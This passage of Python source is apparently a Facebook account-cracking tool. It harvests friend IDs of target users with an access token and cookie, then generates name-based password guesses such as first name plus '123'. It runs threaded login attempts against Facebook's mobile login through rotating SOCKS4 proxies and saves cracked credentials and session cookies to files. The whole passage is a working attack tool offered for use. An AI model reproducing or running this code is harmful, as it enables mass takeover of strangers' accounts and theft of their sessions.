    elif lgmt == '2':
        telegram()
    elif lgmt == '3':
        facebook()
    else:
        linex()
        animation(' \x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37m OPTION NOT FOUND')
        restart()
#############
def whatsapp_group():
	os.system('xdg-open https://chat.whatsapp.com/FUd6zIjyx365bphug0i26p')
	back()
def linex():
	print("""\x1b[37m----------------------------------------------""")
	
def telegram_group():
	os.system('xdg-open https://t.me/+Ykm8W_1IquRlZDk1')
	back()
def linex():
	print("""\x1b[37m----------------------------------------------""")	

def facebook_group():
	print('NOT AVAILABLE JUST NOW')
	print('COMMING SOON')
	back()
def linex():
	print("""\x1b[37m----------------------------------------------""")
#--------------------[PUBLIC]---------------------#

def harry_public():
	try:
		token = open('data/.token.txt','r').read()
		cok = open('data/.cok.txt','r').read()
	except IOError:
		print('[×] INVIALD COOKIE ')
		time.sleep(5)
		login()
	try:
		linex()
		jum = int(input(' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m ENTER TARGET AMOUNT  : '))
		linex()
	except ValueError:
		linex()
		animation(' \x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37m INVALID OPTION ')
		restart()
	if jum<1 or jum>100000000:
		linex()
		animation(' \x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37m TRY AGAIN ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m INPUT UID '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			head = (
			{"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
			})
			if len(id) == 0:
				params = (
				{
				'access_token': token,
				'fields': "friends"
				}	          
			)
			else:
				params = (
				{
				'access_token': token,
				'fields': "friends"
				}	           
			)
			col = ses.get('https://graph.facebook.com/{}'.format(userr),params=params,headers=head,cookies={'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			linex()
			animation(' \x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37m TRY AGAIN ')
			os.system('clear')
	try:
		linex()
		print(f' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m TOTAL ID : \x1b[38;5;196m'+str(len(id))+'\x1b[37m')
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{u}')
		back()
	except (KeyError,IOError):
		linex()
		animation(" [×] DUMP ID FAILED ")
		time.sleep(3)
		back()
#--------------------------[FILE]--------------------------#

#-------------[ PENGATURAN-IDZ ]---------------#

def setting():
	linex()
	print(" \x1b[38;5;196m[\x1b[37m1\x1b[38;5;196m]\x1b[37m ONLY OLD IDZ")
	print(" \x1b[38;5;196m[\x1b[37m2\x1b[38;5;196m]\x1b[37m ONLY NEW IDZ")
	print(" \x1b[38;5;196m[\x1b[37m3\x1b[38;5;196m]\x1b[37m BOTH MIX IDZ")
	linex()
	hu = input(' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m CHOOSE : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
	elif hu in ['2','02']:
		muda=[] 
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	linex()	
	hc = input(' [\u001b[36m•\033[1;37m] CHOOSE : ')
	if hc in ['1','01']:
		method.append('mobile')
	passwrd()
	exit() 
#-------------------[ BAGIAN-WORDLIST ]------------#

def passwrd():
	os.system('clear')
	banner()
	info()
	print(f' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m TOTAL SCANNABLE IDS    :',str(len(id)))
	print(" \x1b[37m\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m YOU STARTED CLONING AT : "+time.strftime("%H:%M")+" "+ tag)
	linex()
	print(f' \x1b[38;5;196m>>\x1b[37m USE FLIGHT MODE EVERY 500 IDS ')
	linex()
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			pwv = []
			frs = nmf.split(' ')[0]
			try:
				lst = nmf.split(' ')[1]
			except:
				lst = ''
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(nmf)
					pwv.append(frs+lst)
					pwv.append(frs+'@'+lst)
					pwv.append(frs+'#'+lst)
					pwv.append(lst+frs)
					pwv.append(frs+'12')
					pwv.append(frs+'123')
					pwv.append(frs+'321')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'@123')
					pwv.append(frs+'@1234')
					pwv.append(frs+lst+'123')
					pwv.append(frs+lst+'1234')
					pwv.append(frs+lst+'@123')
					pwv.append(frs+lst+'@1234')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+lst)
					pwv.append(frs+'@'+lst)
					pwv.append(frs+'#'+lst)
					pwv.append(lst+frs)
					pwv.append(frs+'12')
					pwv.append(frs+'123')
					pwv.append(frs+'321')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'@123')
					pwv.append(frs+'@1234')
					pwv.append(frs+lst+'123')
					pwv.append(frs+lst+'1234')
					pwv.append(frs+lst+'@123')
					pwv.append(frs+lst+'@1234')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'bapi' in method:
				pool.submit(bapi,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			else:
				pool.submit(crackmbasic,idf,pwv)
	print('\n\x1b[37m----------------------------------------------')
	print(' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m CLONING COMPLETE AT '+time.strftime("%H:%M")+" "+ tag)
	print(' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m OK : %s '%(ok))
	print(' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m CP : %s '%(cp))
	linex()
	woi = input(' \x1b[38;5;196m>>\x1b[37m ENTER TO BACK')
	input=ask('back to enter')
	restart()
#---------------[METHOD------------------#
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	rr = random.randint
	rc = random.choice
	sys.stdout.write(f"\r{bo}YOKIA-AHAMED{P}|{P}{loop}|{len(id)}{P}|{H}OK-{ok}{P}|{K}CP-{cp}")
	sys.stdout.flush()
	Sllowly = random.choice(["id-ID,id;q=0.9","en-US,en;q=0.9","en-GB,en;q=0.9","bd-BD,bd;q=0.9","es-LA,es;q=0.9","es-MX,es;q=0.9"])
	ua = random.choice(ugen) 
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=266003681172790&kid_directed_site=0&app_id=266003681172790&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv11.0%2Fdialog%2Foauth%3Fclient_id%3D266003681172790%26redirect_uri%3Dhttps%253A%252F%252Fapp.heylink.me%252Flogin%252Ffacebook%26state%3Dfbloginheylinkme%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5327ef2a-17a4-41a6-ba33-aa8acdda0343%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fapp.heylink.me%2Flogin%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dfbloginheylinkme%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&rtime=1702051010&hrc=1&wtsid=rdr_03CkC8hTBPuvnU7RM&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'en-US,en;q=0.9','cache-control': 'max-age=0','dpr': '1.875','referer': 'https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8','sec-ch-prefers-color-scheme': 'dark','sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"','sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"','sec-ch-ua-mobile': '?1','sec-ch-ua-model': '"BE2013"','sec-ch-ua-platform': '"Android"','sec-ch-ua-platform-version': '"11.0.0"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': ua,'viewport-width': '980',}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=266003681172790&auth_token=163217a672b552df614d575382df8cc6&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv11.0%2Fdialog%2Foauth%3Fclient_id%3D266003681172790%26redirect_uri%3Dhttps%253A%252F%252Fapp.heylink.me%252Flogin%252Ffacebook%26state%3Dfbloginheylinkme%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5327ef2a-17a4-41a6-ba33-aa8acdda0343%26tp%3Dunspecified&refsrc=deprecated&app_id=266003681172790&cancel=https%3A%2F%2Fapp.heylink.me%2Flogin%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dfbloginheylinkme%23_%3D_&lwv=100',data=data,headers=headers,allow_redirects=False,proxies=proxs)
			if "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{P}[{H}YOKIA-OK{P}] {H}{idf}|{pw}\n{P}[{H}COOKIE{P}\n\033[1;31m{kuki}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				open('/sdcard/YOKIA-OK.txt', 'a').write( idf+' â€¢ '+pw+'\n')
				break
			elif "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{P}[{K}YOKIA-CP{P}] {K}{idf}|{pw}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break

			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#--------------------[FILE-NEED]--------------------------#
if __name__=='__main__':
	try:os.mkdir('/sdcard/YOKIA')
	except:pass
	try:os.mkdir('data')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	login()
	
#----------------------[FILE]-------------------_------#

	
	




		
    
	
    
